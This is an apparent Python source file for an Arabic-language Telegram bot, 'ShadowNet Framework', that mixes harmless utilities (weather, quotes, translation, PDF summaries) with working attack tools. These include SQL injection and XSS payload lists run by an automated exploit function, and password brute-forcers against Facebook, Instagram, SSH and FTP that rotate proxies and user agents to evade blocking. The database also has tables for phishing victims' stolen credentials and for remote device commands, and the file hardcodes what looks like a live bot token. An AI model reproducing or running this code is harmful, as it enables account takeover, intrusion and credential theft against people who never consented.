# -*- coding: utf-8 -*-

"""
ShadowNet Framework v7.0 - النظام المتكامل للاختبارات الأمنية
مع جميع التعديلات المطلوبة (حل مشكلة التوقف، إخفاء أزرار القرصنة، نظام نقاط، ترجمة، طقس، اقتباسات، نصائح، محادثة، إلخ)
جميع الميزات تعمل بشكل حقيقي
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
from PIL import Image, ImageDraw, ImageFont

# ===================== استيراد المكتبات الأساسية =====================
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from flask import Flask, request, jsonify, abort, render_template_string, send_file
    from flask_limiter import Limiter
    from flask_limiter.util import get_remote_address
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier
    import dns.resolver
    import whois
    import paramiko
    import ftplib
    from scapy.all import ARP, Ether, send, srp
    import yt_dlp
    import pypdf
    from bs4 import BeautifulSoup
    import builtwith
    import googletrans
    from googletrans import Translator
    from gtts import gTTS
    import wikipedia
except ImportError as e:
    print(f"مكتبة مفقودة: {e}")
    print("يرجى تثبيت المكتبات المطلوبة باستخدام: pip install -r requirements.txt")
    sys.exit(1)

# ===================== الإعدادات الأساسية =====================
TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
NEWS_API_KEY = os.environ.get('NEWS_API_KEY', '')
SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

# ===================== إعدادات Flask و Limiter =====================
app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        created_at TEXT,
        last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (
        chat_id INTEGER PRIMARY KEY,
        token TEXT UNIQUE,
        FOREIGN KEY (chat_id) REFERENCES users(chat_id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS chat_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        from_user INTEGER,
        to_user INTEGER,
        message TEXT,
        timestamp TEXT,
        is_bot_reply INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        action TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_state (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS intrusion_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, endpoint TEXT, method TEXT, user_agent TEXT, timestamp TEXT, details TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_collector INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN last_seen TEXT")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector) VALUES (?, 1, 999, ?, 1)", 
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1, can_use_collector = 1 WHERE chat_id = ?", (ADMIN_ID,))
    c.execute("INSERT OR IGNORE INTO user_tokens (chat_id, token) VALUES (?, ?)", (ADMIN_ID, secrets.token_urlsafe(16)))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة =====================
def generate_user_token(chat_id):
    token = secrets.token_urlsafe(16)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    conn.commit()
    conn.close()
    return token

def get_user_token(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    else:
        return generate_user_token(chat_id)

def get_chat_id_by_token(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    return None

def user_can_use_collector(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def set_user_collector_permission(chat_id, allow):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET can_use_collector = ? WHERE chat_id = ?", (1 if allow else 0, chat_id))
    conn.commit()
    conn.close()

def is_admin(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def is_banned(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def get_user_points(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

def add_points(chat_id, amount, reason):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
    c.execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
              (chat_id, amount, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def deduct_points(chat_id, amount, reason):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    if not row or row[0] < amount:
        conn.close()
        return False
    c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
    c.execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
              (chat_id, -amount, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True

def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def get_referral_code(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        return row[0]
    else:
        code = generate_referral_code()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
        conn.commit()
        conn.close()
        return code

def save_scan_result(target, scan_type, results):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
              (target, scan_type, json.dumps(results), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML', timeout=60)
    except Exception as e:
        logging.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"إشعار: {msg}")

def log_intrusion(ip, endpoint, method, user_agent, details=''):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO intrusion_logs (ip, endpoint, method, user_agent, timestamp, details) VALUES (?, ?, ?, ?, ?, ?)",
              (ip, endpoint, method, user_agent, datetime.now().isoformat(), details))
    conn.commit()
    conn.close()
    notify_admin(f"نشاط مشبوه!\nIP: {ip}\nEndpoint: {endpoint}\nMethod: {method}\nUser-Agent: {user_agent}\nDetails: {details}")

def log_activity(chat_id, action):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
              (chat_id, action, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def update_last_seen(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))
    conn.commit()
    conn.close()

# ===================== دوال الصور الترحيبية =====================
def create_welcome_image(user_name):
    try:
        img = Image.new('RGB', (800, 400), color=(33, 150, 243))
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("arial.ttf", 40)
        except:
            font = ImageFont.load_default()
        draw.text((400, 200), f"مرحباً {user_name}!", fill=(255,255,255), anchor="mm", font=font)
        draw.text((400, 260), "أنا هنا لمساعدتك", fill=(200,200,200), anchor="mm", font=font)
        path = f"welcome_{int(time.time())}.png"
        img.save(path)
        return path
    except Exception as e:
        return None

# ===================== دوال الاقتباسات والنصائح =====================
QUOTES = {
    'arabic': {
        'حزين': [
            "الفراق مؤلم ولكن الحياة تستمر",
            "الوحدة قاسية لكنها تعلمنا الصبر",
            "الحزن زائر عابر، لا تدعه يسكن قلبك",
            "في قلب كل جرح حكمة، وفي كل دموع دعاء"
        ],
        'عميق': [
            "الحياة رحلة قصيرة، عشها بوعي",
            "الروح تتوق إلى ما لا تراه العين",
            "أعمق الجروح هي التي لا ترى بالعين",
            "الصمت أحياناً يكون أبلغ من الكلام"
        ],
        'جميل': [
            "الحب نور يضيء القلوب المظلمة",
            "الأمل يبقى آخر ما يموت في النفس",
            "الجمال الحقيقي في الروح الطيبة",
            "ابتسامة صادقة تغير العالم"
        ]
    },
    'english': {
        'sad': [
            "Goodbye is painful, but life goes on",
            "Loneliness is harsh, but it teaches patience",
            "Sadness is a passing visitor, don't let it stay",
            "In every wound there is wisdom, in every tear a prayer"
        ],
        'deep': [
            "Life is a short journey, live it consciously",
            "The soul yearns for what the eye cannot see",
            "The deepest wounds are those unseen",
            "Silence is sometimes louder than words"
        ],
        'beautiful': [
            "Love is a light that illuminates dark hearts",
            "Hope remains the last thing to die in the soul",
            "True beauty lies in the kind soul",
            "A sincere smile changes the world"
        ]
    }
}

TIPS = {
    'دراسية': [
        "خصص وقتاً منتظماً للمذاكرة يومياً",
        "راجع دروسك قبل النوم لترسيخ المعلومات",
        "استخدم تقنية البومودورو للتركيز",
        "اكتب ملخصاتك بيدك لتثبيت المعلومة"
    ],
    'اجتماعية': [
        "كن صادقاً مع أصدقائك في كل الأوقات",
        "استمع أكثر مما تتحدث لتتعلم",
        "الاحترام المتبادل أساس العلاقات الناجحة",
        "ساعد الآخرين دون انتظار مقابل"
    ],
    'للاكتئاب': [
        "لا تيأس، الحياة جميلة وسوف تشرق شمس جديدة",
        "اطلب المساعدة من المقربين، لا تتحمل وحدك",
        "تذكر أن هذه الأيام ستمر، والألم سيخفف",
        "اهتم بنفسك، صحتك النفسية مهمة"
    ],
    'إسلامية': [
        "توكل على الله في كل أمورك فهو خير وكيل",
        "أكثر من الاستغفار، فهو يفتح أبواب الرزق",
        "الصبر مفتاح الفرج، فلا تيأس من رحمة الله",
        "ذكر الله يطمئن القلوب، فأكثر من تسبيحه"
    ]
}

# ===================== دوال الخدمات العامة =====================
def get_weather(city):
    try:
        url = f"https://wttr.in/{city}?format=%C+%t+%w+%h+%p&lang=ar"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.text.strip()
        else:
            return "فشل جلب الطقس"
    except:
        return "خطأ في الاتصال"

def wikipedia_search(query):
    try:
        wikipedia.set_lang("ar")
        summary = wikipedia.summary(query, sentences=5)
        return summary
    except wikipedia.exceptions.DisambiguationError as e:
        return f"هناك عدة نتائج: {e.options[:5]}"
    except wikipedia.exceptions.PageError:
        return "لم يتم العثور على صفحة"
    except:
        return "خطأ في البحث"

def password_generator(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(chars) for _ in range(length))
    return password

def password_strength(password):
    score = 0
    length = len(password)
    if length >= 8:
        score += 1
    if length >= 12:
        score += 1
    if re.search(r'[a-z]', password):
        score += 1
    if re.search(r'[A-Z]', password):
        score += 1
    if re.search(r'\d', password):
        score += 1
    if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        score += 1
    if score <= 2:
        strength = "ضعيفة جداً"
        crack_time = "أقل من ثانية"
    elif score <= 4:
        strength = "ضعيفة"
        crack_time = "بضع ثوانٍ"
    elif score <= 5:
        strength = "متوسطة"
        crack_time = "ساعات"
    elif score <= 6:
        strength = "قوية"
        crack_time = "أيام"
    else:
        strength = "قوية جداً"
        crack_time = "سنوات"
    return strength, crack_time, score

def text_to_speech(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        filename = f"tts_{int(time.time())}.mp3"
        filepath = os.path.join('temp', filename)
        os.makedirs('temp', exist_ok=True)
        tts.save(filepath)
        return filepath
    except Exception as e:
        return None

def translate_text_advanced(text, target_lang='ar'):
    try:
        translator = Translator()
        detected = translator.detect(text)
        translated = translator.translate(text, dest=target_lang)
        chunks = []
        chunk_size = 4000
        for i in range(0, len(translated.text), chunk_size):
            chunks.append(translated.text[i:i+chunk_size])
        return chunks, detected.lang
    except Exception as e:
        return [text], 'unknown'

def get_news(topic):
    if not NEWS_API_KEY:
        return "مفتاح NewsAPI غير مضبوط"
    try:
        url = f"https://newsapi.org/v2/everything?q={topic}&language=ar&apiKey={NEWS_API_KEY}&pageSize=5"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data['status'] == 'ok':
                articles = data['articles']
                if articles:
                    msg = f"أخبار عن {topic}:\n"
                    for article in articles[:5]:
                        msg += f"- {article['title']}\n"
                        msg += f"  {article['description']}\n\n"
                    return msg
                else:
                    return "لا توجد أخبار حالياً"
            else:
                return f"خطأ في NewsAPI: {data.get('message', '')}"
        else:
            return "فشل الاتصال بـ NewsAPI"
    except Exception as e:
        return f"خطأ: {str(e)}"

# ===================== دوال فحص الرابط المتقدمة =====================
def check_link_safety_advanced(url, chat_id):
    # خصم 5 نقاط
    if not deduct_points(chat_id, 5, "فحص رابط"):
        return "رصيدك من النقاط لا يكفي (تحتاج 5 نقاط)"
    
    result = {
        'url': url,
        'safe': True,
        'risk_level': 'آمن',
        'threats': [],
        'details': {},
        'recommendations': []
    }
    try:
        parsed = urlparse(url)
        domain = parsed.netloc
        if not domain:
            domain = url.split('/')[0]

        if not url.startswith('https://'):
            result['safe'] = False
            result['threats'].append({
                'type': 'HTTP',
                'severity': 'عالٍ',
                'description': 'الرابط غير مشفر (HTTP)، مما يعرض البيانات للاعتراض (MITM).'
            })
            result['recommendations'].append('استخدم HTTPS دائماً لحماية البيانات.')
        else:
            result['details']['https'] = 'مفعل'

        shortened_domains = ['bit.ly', 'tinyurl.com', 'goo.gl', 'ow.ly', 'is.gd', 'cli.gs', 'short.link', 'cut.ly', 'rebrand.ly']
        if any(sd in domain for sd in shortened_domains):
            result['safe'] = False
            result['threats'].append({
                'type': 'Shortened URL',
                'severity': 'متوسط',
                'description': f'الرابط مختصر عبر {domain}. الروابط المختصرة تستخدم غالباً لإخفاء وجهات خبيثة.'
            })
            result['recommendations'].append('استخدم أدوات فك اختصار الروابط لمعرفة الوجهة الحقيقية.')

        suspicious_keywords = ['phishing', 'malware', 'virus', 'scam', 'fraud', 'fake', 'hack', 'crack', 'keygen', 'serial', 'login', 'verify', 'secure', 'update', 'confirm']
        for keyword in suspicious_keywords:
            if keyword in domain.lower() or keyword in url.lower():
                result['safe'] = False
                result['threats'].append({
                    'type': 'Suspicious Keyword',
                    'severity': 'عالٍ',
                    'description': f'تم العثور على كلمة مشبوهة "{keyword}" في الرابط، مما يشير إلى احتمالية الاحتيال.'
                })
                result['recommendations'].append('تجنب فتح الروابط التي تحتوي على كلمات مثل login, verify, secure إلا من مصادر موثوقة.')
                break

        popular_domains = ['google.com', 'facebook.com', 'youtube.com', 'twitter.com', 'instagram.com', 'whatsapp.com', 'telegram.org', 'microsoft.com', 'apple.com']
        for pd in popular_domains:
            if pd in domain and domain != pd:
                if len(domain) > len(pd) and pd in domain:
                    result['safe'] = False
                    result['threats'].append({
                        'type': 'Typosquatting',
                        'severity': 'عالٍ',
                        'description': f'النطاق "{domain}" يشبه النطاق الشهير "{pd}" وقد يكون محاولة لخداع المستخدمين.'
                    })
                    result['recommendations'].append('تأكد من كتابة النطاق بشكل صحيح، خاصة عند إدخال بيانات حساسة.')
                    break

        if VIRUSTOTAL_API_KEY:
            try:
                vt_url = f"https://www.virustotal.com/api/v3/domains/{domain}"
                headers = {"x-apikey": VIRUSTOTAL_API_KEY}
                resp = requests.get(vt_url, headers=headers, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        result['safe'] = False
                        result['threats'].append({
                            'type': 'VirusTotal',
                            'severity': 'خطير',
                            'description': f'تم اكتشاف {malicious} تهديد (فيروس/برمجية خبيثة) في VirusTotal لهذا النطاق.'
                        })
                        result['recommendations'].append('لا تفتح هذا الرابط تحت أي ظرف، فقد يكون مصاباً ببرمجيات خبيثة.')
                    elif suspicious > 0:
                        result['safe'] = False
                        result['threats'].append({
                            'type': 'VirusTotal',
                            'severity': 'متوسط',
                            'description': f'تم اكتشاف {suspicious} عنصر مشبوه في VirusTotal لهذا النطاق.'
                        })
                        result['recommendations'].append('يُنصح بتوخي الحذر عند فتح هذا الرابط.')
            except:
                pass

        if result['safe']:
            result['risk_level'] = 'آمن'
        elif len(result['threats']) >= 2 and any(t['severity'] == 'خطير' for t in result['threats']):
            result['risk_level'] = 'خطير جداً'
        elif len(result['threats']) >= 1 and any(t['severity'] == 'خطير' for t in result['threats']):
            result['risk_level'] = 'خطير'
        elif len(result['threats']) >= 1:
            result['risk_level'] = 'مشبوه'
    except Exception as e:
        result['safe'] = False
        result['threats'].append({
            'type': 'Error',
            'severity': 'متوسط',
            'description': f'حدث خطأ أثناء الفحص: {str(e)[:100]}'
        })
        result['risk_level'] = 'غير معروف'
    return result

def format_link_report(result):
    msg = f"تقرير فحص الرابط\n\n"
    msg += f"الرابط: {result['url']}\n"
    msg += f"الحالة: {'آمن' if result['safe'] else 'غير آمن'}\n"
    msg += f"مستوى الخطر: {result['risk_level']}\n\n"
    if result['threats']:
        msg += "التهديدات المكتشفة:\n"
        for threat in result['threats']:
            msg += f"- {threat['type']} (خطورة: {threat['severity']})\n"
            msg += f"  {threat['description']}\n"
    else:
        msg += "لم يتم اكتشاف أي تهديدات\n"
    if result['details']:
        msg += "\nتفاصيل إضافية:\n"
        for key, value in result['details'].items():
            msg += f"- {key}: {value}\n"
    if result['recommendations']:
        msg += "\nتوصيات:\n"
        for rec in result['recommendations']:
            msg += f"- {rec}\n"
    return msg

# ===================== دوال تحليل PDF =====================
def extract_pdf_text(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def summarize_pdf_text(text, max_sentences=6):
    if not text:
        return "لم يتم استخراج أي نص من الملف"
    sentences = re.split(r'[.!?]', text)
    sentences = [s.strip() for s in sentences if len(s.strip()) > 20]
    if len(sentences) <= max_sentences:
        return text[:1000] + "..."
    words = re.findall(r'\b\w+\b', text.lower())
    word_freq = {}
    for w in words:
        if len(w) > 3:
            word_freq[w] = word_freq.get(w, 0) + 1
    scored_sentences = []
    for s in sentences:
        score = sum(word_freq.get(w, 0) for w in re.findall(r'\b\w+\b', s.lower()))
        scored_sentences.append((score, s))
    scored_sentences.sort(reverse=True)
    summary_sentences = [s for _, s in scored_sentences[:max_sentences]]
    return '. '.join(summary_sentences) + '.'

def smart_pdf_search(text, question):
    if not text:
        return "لم يتم تحميل أي نص"
    paragraphs = text.split('\n\n')
    paragraphs = [p.strip() for p in paragraphs if len(p.strip()) > 50]
    question_lower = question.lower()
    keywords = re.findall(r'\b\w+\b', question_lower)
    keywords = [w for w in keywords if len(w) > 3]
    scored_paragraphs = []
    for para in paragraphs:
        para_lower = para.lower()
        score = sum(1 for kw in keywords if kw in para_lower)
        if score > 0:
            scored_paragraphs.append((score, para))
    scored_paragraphs.sort(reverse=True)
    if scored_paragraphs:
        best_para = scored_paragraphs[0][1]
        if len(scored_paragraphs) > 1 and scored_paragraphs[1][0] > scored_paragraphs[0][0] * 0.5:
            best_para += "\n\n" + scored_paragraphs[1][1]
        answer = f"الإجابة:\n\n{best_para[:1500]}"
        if len(best_para) > 1500:
            answer += "\n\n...(تم اختصار الإجابة للطول)"
        return answer
    else:
        return "لم يتم العثور على إجابة مناسبة في الملف"

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def analyze_apk(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return {'error': 'مفتاح VirusTotal غير مضبوط'}
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    return {
                        'malicious': stats.get('malicious', 0),
                        'suspicious': stats.get('suspicious', 0),
                        'harmless': stats.get('harmless', 0),
                        'undetected': stats.get('undetected', 0)
                    }
        return {'error': 'فشل فحص الملف'}
    except Exception as e:
        return {'error': str(e)}

def download_video(url):
    try:
        ydl_opts = {
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'quiet': True,
            'no_warnings': True,
            'format': 'best[ext=mp4]/best',
            'extract_flat': False,
            'ignoreerrors': True,
            'no_color': True,
            'geo_bypass': True,
            'retries': 10,
            'fragment_retries': 10,
            'headers': {'User-Agent': get_random_ua()}
        }
        if 'facebook.com' in url or 'fb.watch' in url:
            ydl_opts['extractor_args'] = {
                'facebook': {
                    'prefer_facebook_web': ['true'],
                    'video_codec': ['h264'],
                    'audio_codec': ['aac']
                }
            }
        os.makedirs('downloads', exist_ok=True)
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename) and os.path.getsize(filename) > 0:
                    return filename, None
                else:
                    return None, "فشل تحميل الفيديو: الملف غير موجود أو فارغ"
            else:
                return None, "فشل استخراج معلومات الفيديو"
    except yt_dlp.utils.DownloadError as e:
        return None, f"خطأ في التحميل: {str(e)[:150]}"
    except Exception as e:
        return None, f"خطأ: {str(e)[:150]}"

def exploit_sqli(url, parameter, payload):
    test_url = f"{url}?{parameter}={payload}"
    try:
        response = stealth_request(test_url)
        if response and ('sql' in response.text.lower() or 'mysql' in response.text.lower() or 'syntax' in response.text.lower()):
            return True, response.text[:500]
    except:
        pass
    return False, None

def exploit_xss(url, parameter, payload):
    test_url = f"{url}?{parameter}={payload}"
    try:
        response = stealth_request(test_url)
        if response and payload in response.text:
            return True, response.text[:500]
    except:
        pass
    return False, None

def comprehensive_exploit(url):
    results = {'url': url, 'vulnerabilities': [], 'exploited': [], 'risk': 'منخفض'}
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
    parsed = urlparse(url)
    if parsed.query:
        params = parsed.query.split('&')
        for param in params:
            key = param.split('=')[0]
            for payload in sqli_payloads:
                success, output = exploit_sqli(url, key, payload)
                if success:
                    results['vulnerabilities'].append(f"SQL Injection في المعامل {key}")
                    results['exploited'].append({'type': 'SQL Injection', 'parameter': key, 'payload': payload, 'evidence': output[:200]})
                    break
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    if parsed.query:
        params = parsed.query.split('&')
        for param in params:
            key = param.split('=')[0]
            for payload in xss_payloads:
                success, output = exploit_xss(url, key, payload)
                if success:
                    results['vulnerabilities'].append(f"XSS في المعامل {key}")
                    results['exploited'].append({'type': 'XSS', 'parameter': key, 'payload': payload, 'evidence': output[:200]})
                    break
    if results['vulnerabilities']:
        results['risk'] = 'مرتفع' if len(results['vulnerabilities']) >= 2 else 'متوسط'
    return results

def brute_force_facebook(email_or_phone, password_list, max_attempts=100):
    login_url = "https://www.facebook.com/login.php"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        if i % 5 == 0:
            proxy = get_random_proxy()
        else:
            proxy = None
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        try:
            resp = session.get(login_url, timeout=10)
            if resp.status_code != 200:
                continue
            token_match = re.search(r'name="fb_dtsg" value="([^"]+)"', resp.text)
            token = token_match.group(1) if token_match else ''
            data = {'email': email_or_phone, 'pass': pwd, 'fb_dtsg': token, 'login': 'Log In'}
            login_resp = session.post(login_url, data=data, timeout=10, allow_redirects=False)
            if login_resp.status_code == 302 and 'c_user' in login_resp.cookies:
                results['success'] = True
                results['credentials'] = {'username': email_or_phone, 'password': pwd}
                break
        except:
            pass
        time.sleep(random.uniform(1, 3))
    return results

def brute_force_instagram(username, password_list, max_attempts=100):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua(), 'X-Requested-With': 'XMLHttpRequest'})
    try:
        resp = session.get("https://www.instagram.com/", timeout=10)
        csrf = resp.cookies.get('csrftoken', '')
    except:
        csrf = ''
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        if i % 3 == 0:
            session.headers.update({'User-Agent': get_random_ua()})
        data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}'}
        headers = {'X-CSRFToken': csrf}
        try:
            resp = session.post(login_url, data=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                json_resp = resp.json()
                if json_resp.get('authenticated'):
                    results['success'] = True
                    results['credentials'] = {'username': username, 'password': pwd}
                    break
        except:
            pass
        time.sleep(random.uniform(2, 4))
    return results

def brute_force_ssh(ip, username, password_list, max_attempts=100):
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for pwd in password_list[:max_attempts]:
        results['attempts'] += 1
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=5)
            results['success'] = True
            results['credentials'] = {'username': username, 'password': pwd}
            client.close()
            break
        except:
            continue
    return results

def brute_force_ftp(ip, username, password_list, max_attempts=100):
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for pwd in password_list[:max_attempts]:
        results['attempts'] += 1
        try:
            ftp = ftplib.FTP(ip)
            ftp.login(username, pwd)
            results['success'] = True
            results['credentials'] = {'username': username, 'password': pwd}
            ftp.quit()
            break
        except:
            continue
    return results

